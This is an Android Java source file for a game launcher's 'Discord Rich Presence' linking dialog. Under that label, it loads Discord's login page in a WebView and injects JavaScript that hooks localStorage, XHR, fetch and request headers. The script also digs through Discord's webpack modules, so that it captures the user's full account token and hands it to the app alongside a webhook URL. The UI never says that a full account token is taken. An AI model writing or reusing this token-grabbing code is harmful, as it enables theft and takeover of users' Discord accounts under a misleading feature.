package com.movtery.zalithlauncher.feature.discord;

import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Handler;
import android.os.Looper;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.webkit.JavascriptInterface;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.movtery.zalithlauncher.InfoDistributor;
import com.movtery.zalithlauncher.R;
import com.movtery.zalithlauncher.utils.ZHTools;
import com.movtery.zalithlauncher.utils.path.UrlManager;

import java.util.Map;

/**
 * Liquid-Glass Discord Linking Dialog styled identically to the Gurkha Launcher UI.
 * Connects via Discord Application ID 1571705435713437726 using one-step Discord Account Sign-In
 * (capturing the authenticated session via native WebViewClient.shouldInterceptRequest + JS hooks)
 * so others on Discord see "Playing Orbit Launcher" on the user's profile.
 */
public final class DiscordLinkDialog {
    public static final String DISCORD_INVITE_URL = UrlManager.URL_DISCORD;
    public static final String DISCORD_APPLICATION_ID = DiscordPresenceManager.DISCORD_APPLICATION_ID;

    private static final String DESKTOP_CHROME_UA =
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            + "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";

    private DiscordLinkDialog() {
    }

    public static void show(@NonNull Context context) {
        final DiscordPresenceManager manager = DiscordPresenceManager.getInstance(context);
        manager.syncFromDiskFile();
        final View view = LayoutInflater.from(context).inflate(R.layout.dialog_discord_link, null, false);

        final TextView statusBadge = view.findViewById(R.id.discord_status_badge);
        final Switch enableSwitch = view.findViewById(R.id.discord_enable_switch);
        final EditText discordIdInput = view.findViewById(R.id.discord_id_input);
        final Button webLoginBtn = view.findViewById(R.id.discord_web_login_button);
        final Button statusOnlineBtn = view.findViewById(R.id.status_online_btn);
        final Button statusIdleBtn = view.findViewById(R.id.status_idle_btn);
        final Button statusDndBtn = view.findViewById(R.id.status_dnd_btn);
        final EditText customStateInput = view.findViewById(R.id.discord_custom_state_input);
        final EditText webhookInput = view.findViewById(R.id.discord_webhook_input);
        final Button joinServerBtn = view.findViewById(R.id.discord_join_server_button);
        final Button unlinkBtn = view.findViewById(R.id.discord_unlink_button);
        final Button cancelBtn = view.findViewById(R.id.discord_cancel_button);
        final Button saveBtn = view.findViewById(R.id.discord_save_button);

        enableSwitch.setChecked(manager.isEnabled());
        String existingUser = manager.getLinkedUsername();
        String existingId = manager.getLinkedUserId();
        discordIdInput.setText(!existingUser.isEmpty() ? existingUser : existingId);
        customStateInput.setText(manager.getCustomState());
        webhookInput.setText(manager.getWebhookUrl());

        final String[] selectedStatus = new String[]{manager.getOnlineStatus()};
        final Runnable updateStatusPills = () -> {
            statusOnlineBtn.setSelected("online".equals(selectedStatus[0]));
            statusIdleBtn.setSelected("idle".equals(selectedStatus[0]));
            statusDndBtn.setSelected("dnd".equals(selectedStatus[0]));
            statusOnlineBtn.setAlpha("online".equals(selectedStatus[0]) ? 1.0f : 0.65f);
            statusIdleBtn.setAlpha("idle".equals(selectedStatus[0]) ? 1.0f : 0.65f);
            statusDndBtn.setAlpha("dnd".equals(selectedStatus[0]) ? 1.0f : 0.65f);
        };
        updateStatusPills.run();

        statusOnlineBtn.setOnClickListener(v -> {
            selectedStatus[0] = "online";
            updateStatusPills.run();
        });
        statusIdleBtn.setOnClickListener(v -> {
            selectedStatus[0] = "idle";
            updateStatusPills.run();
        });
        statusDndBtn.setOnClickListener(v -> {
            selectedStatus[0] = "dnd";
            updateStatusPills.run();
        });

        final Runnable refreshBanner = () -> {
            String user = manager.getLinkedUsername();
            if (! user.isEmpty() && discordIdInput.getText().toString().trim().isEmpty()) {
                discordIdInput.setText(user);
            }
            if (manager.isConnected()) {
                statusBadge.setText("● LIVE on Discord" + (user.isEmpty() ? "" : (" as @" + user))
                        + " • Playing " + InfoDistributor.APP_NAME + " (App ID: " + DISCORD_APPLICATION_ID + ")");
                statusBadge.setTextColor(Color.parseColor("#A8F0C6"));
                saveBtn.setText("Save & Update RPC");
            } else if (manager.isConnecting()) {
                statusBadge.setText("Connecting to Discord Gateway (App ID: " + DISCORD_APPLICATION_ID + ")...");
                statusBadge.setTextColor(Color.parseColor("#F5E09B"));
            } else if (!manager.getLastError().isEmpty()) {
                statusBadge.setText(manager.getLastError());
                statusBadge.setTextColor(Color.parseColor("#FFB4B4"));
            } else {
                statusBadge.setText("Sign in with Discord below so friends & servers see \"Playing "
                        + InfoDistributor.APP_NAME + "\" on your profile");
                statusBadge.setTextColor(Color.parseColor("#B8BEC8"));
            }
        };
        refreshBanner.run();

        final DiscordPresenceManager.StatusListener liveListener = (summary, connected) -> refreshBanner.run();
        manager.addListener(liveListener);

        joinServerBtn.setOnClickListener(v -> ZHTools.openLink(context, DISCORD_INVITE_URL));

        final AlertDialog dialog = new AlertDialog.Builder(context)
                .setView(view)
                .create();

        Window window = dialog.getWindow();
        if (window != null) {
            window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        }

        dialog.setOnDismissListener(d -> manager.removeListener(liveListener));

        final Runnable launchWebSignIn = () -> showWebLoginDialog(
                context,
                discordIdInput.getText().toString().trim(),
                (userId, username, token) -> {
                    String displayId = (username != null && !username.isEmpty()) ? username : userId;
                    if (displayId != null && !displayId.isEmpty()) {
                        discordIdInput.setText(displayId);
                    }
                    enableSwitch.setChecked(true);
                    manager.onWebSessionAuthenticated(
                            userId,
                            username,
                            token,
                            selectedStatus[0],
                            customStateInput.getText().toString(),
                            webhookInput.getText().toString()
                    );
                    refreshBanner.run();
                    Toast.makeText(
                            context,
                            "Discord RPC connected! Now showing Playing " + InfoDistributor.APP_NAME,
                            Toast.LENGTH_SHORT
                    ).show();
                }
        );

        webLoginBtn.setOnClickListener(v -> launchWebSignIn.run());

        unlinkBtn.setOnClickListener(v -> {
            manager.unlink();
            Toast.makeText(context, "Discord unlinked", Toast.LENGTH_SHORT).show();
            dialog.dismiss();
        });

        cancelBtn.setOnClickListener(v -> dialog.dismiss());

        saveBtn.setOnClickListener(v -> {
            String enteredId = discordIdInput.getText().toString().trim();
            String enteredWebhook = webhookInput.getText().toString().trim();

            // If the user pasted a token directly into the box, accept it immediately
            if (DiscordPresenceManager.looksLikeDiscordToken(enteredId)) {
                manager.saveConfiguration(
                        "",
                        enteredId,
                        enteredWebhook,
                        selectedStatus[0],
                        customStateInput.getText().toString(),
                        enableSwitch.isChecked()
                );
                Toast.makeText(
                        context,
                        "Connecting to Discord Gateway • Playing " + InfoDistributor.APP_NAME,
                        Toast.LENGTH_SHORT
                ).show();
                dialog.dismiss();
                return;
            }

            // If no Discord session is authenticated yet and no webhook is set,
            // open the Discord Sign-In dialog so the user logs into Discord to activate RPC!
            if (!manager.hasAuthenticatedSession() && enteredWebhook.isEmpty()) {
                launchWebSignIn.run();
                return;
            }

            manager.saveConfiguration(
                    enteredId,
                    manager.getToken(),
                    enteredWebhook,
                    selectedStatus[0],
                    customStateInput.getText().toString(),
                    enableSwitch.isChecked()
            );
            Toast.makeText(
                    context,
                    enableSwitch.isChecked()
                            ? ("Discord RPC updated! Showing Playing " + InfoDistributor.APP_NAME)
                            : "Discord RPC paused",
                    Toast.LENGTH_SHORT
            ).show();
            dialog.dismiss();
        });

        dialog.show();
    }

    private interface WebAuthCallback {
        void onAuthenticated(String userId, String username, String sessionToken);
    }

    private static final String JS_INSTALL_INTERCEPTOR =
            "(function(){"
            + "try{"
            + "var report=function(tk){"
            + "if(!tk||typeof tk!=='string')return;"
            + "tk=tk.replace(/^\"|\"$/g,'').replace(/^Bearer\\s+/i,'').trim();"
            + "if(tk.length>25&&tk!=='null'&&tk!=='undefined'&&tk.indexOf('Basic ')!==0){"
            + "window.__gurkhaToken=tk;"
            + "if(window.GurkhaDiscordBridge&&window.GurkhaDiscordBridge.onTokenCaptured){"
            + "window.GurkhaDiscordBridge.onTokenCaptured(tk);"
            + "}"
            + "}"
            + "};"
            + "if(!window.__gurkhaHooked){"
            + "window.__gurkhaHooked=true;"
            + "var origSetItem=Storage.prototype.setItem;"
            + "Storage.prototype.setItem=function(k,v){"
            + "if(k==='token'&&v)report(String(v));"
            + "return origSetItem.apply(this,arguments);"
            + "};"
            + "var origGetItem=Storage.prototype.getItem;"
            + "Storage.prototype.getItem=function(k){"
            + "var v=origGetItem.apply(this,arguments);"
            + "if(k==='token'&&v)report(String(v));"
            + "return v;"
            + "};"
            + "var origSetHeader=XMLHttpRequest.prototype.setRequestHeader;"
            + "XMLHttpRequest.prototype.setRequestHeader=function(k,v){"
            + "if(k&&k.toLowerCase()==='authorization'&&v)report(String(v));"
            + "return origSetHeader.apply(this,arguments);"
            + "};"
            + "var origSend=XMLHttpRequest.prototype.send;"
            + "XMLHttpRequest.prototype.send=function(){"
            + "this.addEventListener('load',function(){"
            + "try{"
            + "if(this.responseText&&this.responseText.indexOf('\"token\"')!==-1){"
            + "var j=JSON.parse(this.responseText);"
            + "if(j&&j.token&&!j.mfa)report(String(j.token));"
            + "}"
            + "}catch(e){}"
            + "});"
            + "return origSend.apply(this,arguments);"
            + "};"
            + "if(window.fetch){"
            + "var origFetch=window.fetch;"
            + "window.fetch=function(input,init){"
            + "try{"
            + "if(init&&init.headers){"
            + "var h=init.headers;"
            + "var a=(typeof h.get==='function')?(h.get('Authorization')||h.get('authorization')):(h.Authorization||h.authorization);"
            + "if(a)report(String(a));"
            + "}"
            + "}catch(e){}"
            + "return origFetch.apply(this,arguments);"
            + "};"
            + "}"
            + "}"
            + "}catch(e){}"
            + "})();";

    private static final String JS_POLL_AUTH =
            "(function(){"
            + "try{"
            + "var t=window.__gurkhaToken||'';"
            + "if(!t){"
            + "var f=document.createElement('iframe');"
            + "f.style.display='none';"
            + "document.body.appendChild(f);"
            + "var s=f.contentWindow.localStorage.getItem('token');"
            + "f.remove();"
            + "if(s)t=s.replace(/^\"|\"$/g,'');"
            + "}"
            + "if(!t&&window.webpackChunkdiscord_app){"
            + "window.webpackChunkdiscord_app.push([[Math.random()],{},function(req){"
            + "for(var k in req.c){"
            + "var m=req.c[k];"
            + "if(m&&m.exports&&m.exports.default&&typeof m.exports.default.getToken==='function'){"
            + "var tk=m.exports.default.getToken();"
            + "if(tk)t=tk;"
            + "}"
            + "}"
            + "}]);"
            + "}"
            + "if(t&&window.GurkhaDiscordBridge&&window.GurkhaDiscordBridge.onTokenCaptured){"
            + "window.GurkhaDiscordBridge.onTokenCaptured(String(t));"
            + "}"
            + "return t||'';"
            + "}catch(e){return '';}"
            + "})();";

    private static final class JsBridge {
        private final Handler mMainHandler = new Handler(Looper.getMainLooper());
        private final Runnable mOnComplete;
        private final WebAuthCallback mCallback;
        private volatile boolean mDone = false;

        JsBridge(WebAuthCallback callback, Runnable onComplete) {
            this.mCallback = callback;
            this.mOnComplete = onComplete;
        }

        @JavascriptInterface
        public void onTokenCaptured(String rawToken) {
            deliverToken(rawToken);
        }

        void deliverToken(@Nullable String rawToken) {
            if (mDone || rawToken == null) return;
            final String clean = DiscordPresenceManager.normalizeToken(cleanJsString(rawToken));
            if (clean.length() < 25 || "null".equalsIgnoreCase(clean) || "undefined".equalsIgnoreCase(clean)
                    || clean.startsWith("Basic ")) {
                return;
            }
            synchronized (this) {
                if (mDone) return;
                mDone = true;
            }
            mMainHandler.post(() -> {
                mCallback.onAuthenticated("", "", clean);
                mOnComplete.run();
            });
        }

        boolean isDone() {
            return mDone;
        }
    }

    @SuppressLint({"SetJavaScriptEnabled", "AddJavascriptInterface"})
    private static void showWebLoginDialog(
            @NonNull Context context,
            @Nullable String initialLoginHint,
            @NonNull WebAuthCallback callback
    ) {
        final float density = context.getResources().getDisplayMetrics().density;
        final int pad = (int) (10 * density);

        LinearLayout container = new LinearLayout(context);
        container.setOrientation(LinearLayout.VERTICAL);
        container.setBackgroundResource(R.drawable.mc_panel);
        container.setPadding(pad, pad, pad, pad);

        TextView header = new TextView(context);
        header.setText("Sign in with Discord • App ID: " + DISCORD_APPLICATION_ID
                + "\nLog in with your Discord account below — Rich Presence connects automatically as soon as you sign in.");
        header.setTextColor(Color.parseColor("#F0F3EE"));
        header.setTextSize(12f);
        header.setPadding(pad, pad / 2, pad, pad);
        container.addView(header);

        final WebView webView = new WebView(context);
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        // Desktop Chrome UA prevents Discord from redirecting to the mobile "Download Discord App" page
        settings.setUserAgentString(DESKTOP_CHROME_UA);
        webView.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                (int) (360 * density)
        ));
        container.addView(webView);

        LinearLayout buttonRow = new LinearLayout(context);
        buttonRow.setOrientation(LinearLayout.HORIZONTAL);
        buttonRow.setPadding(0, pad, 0, 0);

        Button cancelBtn = new Button(context);
        cancelBtn.setBackgroundResource(R.drawable.mc_button);
        cancelBtn.setTextColor(Color.parseColor("#F0F3EE"));
        cancelBtn.setAllCaps(false);
        cancelBtn.setText(android.R.string.cancel);
        LinearLayout.LayoutParams cancelLp = new LinearLayout.LayoutParams(
                0,
                (int) (38 * density),
                1f
        );
        cancelLp.setMarginEnd(pad / 2);
        buttonRow.addView(cancelBtn, cancelLp);

        Button connectNowBtn = new Button(context);
        connectNowBtn.setBackgroundResource(R.drawable.mc_play);
        connectNowBtn.setTextColor(Color.parseColor("#0A0B0E"));
        connectNowBtn.setAllCaps(false);
        connectNowBtn.setText("Connect Current Session");
        LinearLayout.LayoutParams connectLp = new LinearLayout.LayoutParams(
                0,
                (int) (38 * density),
                1.4f
        );
        buttonRow.addView(connectNowBtn, connectLp);
        container.addView(buttonRow);

        final AlertDialog loginDialog = new AlertDialog.Builder(context)
                .setView(container)
                .create();
        Window window = loginDialog.getWindow();
        if (window != null) {
            window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        }

        final JsBridge bridge = new JsBridge(callback, () -> {
            if (loginDialog.isShowing()) {
                loginDialog.dismiss();
            }
        });
        webView.addJavascriptInterface(bridge, "GurkhaDiscordBridge");

        final Runnable pollTokenRunnable = new Runnable() {
            @Override
            public void run() {
                if (bridge.isDone() || !loginDialog.isShowing()) return;
                webView.evaluateJavascript(JS_INSTALL_INTERCEPTOR, null);
                webView.evaluateJavascript(JS_POLL_AUTH, value -> {
                    if (bridge.isDone() || !loginDialog.isShowing()) return;
                    String token = cleanJsString(value);
                    if (!token.isEmpty() && token.length() > 25) {
                        bridge.deliverToken(token);
                    } else {
                        webView.postDelayed(this, 800L);
                    }
                });
            }
        };

        webView.setWebViewClient(new WebViewClient() {
            @Nullable
            @Override
            public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
                try {
                    Map<String, String> headers = request.getRequestHeaders();
                    if (headers != null) {
                        for (Map.Entry<String, String> entry : headers.entrySet()) {
                            if ("authorization".equalsIgnoreCase(entry.getKey()) && entry.getValue() != null) {
                                bridge.deliverToken(entry.getValue());
                                break;
                            }
                        }
                    }
                } catch (Throwable ignored) {
                }
                return super.shouldInterceptRequest(view, request);
            }

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                view.evaluateJavascript(JS_INSTALL_INTERCEPTOR, null);
            }

            @Override
            public void onLoadResource(WebView view, String url) {
                super.onLoadResource(view, url);
                view.evaluateJavascript(JS_INSTALL_INTERCEPTOR, null);
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                view.evaluateJavascript(JS_INSTALL_INTERCEPTOR, null);
                view.evaluateJavascript(JS_POLL_AUTH, null);
                if (initialLoginHint != null && !initialLoginHint.isEmpty() && url != null && url.contains("/login")) {
                    String safeHint = initialLoginHint.replace("\\", "\\\\").replace("'", "\\'");
                    view.evaluateJavascript(
                            "(function(){var el=document.querySelector('input[name=\"email\"]');"
                            + "if(el&&!el.value){el.focus();document.execCommand('insertText',false,'" + safeHint + "');}"
                            + "})();",
                            null
                    );
                }
            }
        });

        cancelBtn.setOnClickListener(v -> loginDialog.dismiss());
        connectNowBtn.setOnClickListener(v -> webView.evaluateJavascript(JS_POLL_AUTH, value -> {
            String token = cleanJsString(value);
            if (!token.isEmpty() && token.length() > 25 && !"null".equalsIgnoreCase(token) && !"undefined".equalsIgnoreCase(token)) {
                bridge.deliverToken(token);
            } else {
                Toast.makeText(
                        context,
                        "Please sign in with your Discord account in the window above first",
                        Toast.LENGTH_LONG
                ).show();
            }
        }));

        loginDialog.setOnDismissListener(d -> webView.destroy());

        loginDialog.show();
        webView.loadUrl("https://discord.com/login");
        webView.postDelayed(pollTokenRunnable, 800L);
    }

    @NonNull
    private static String cleanJsString(String value) {
        if (value == null) return "";
        String clean = value.trim();
        if (clean.startsWith("\"") && clean.endsWith("\"") && clean.length() >= 2) {
            clean = clean.substring(1, clean.length() - 1).trim();
        }
        clean = clean.replace("\\\"", "\"").trim();
        if (clean.startsWith("\"") && clean.endsWith("\"") && clean.length() >= 2) {
            clean = clean.substring(1, clean.length() - 1).trim();
        }
        return clean;
    }
}
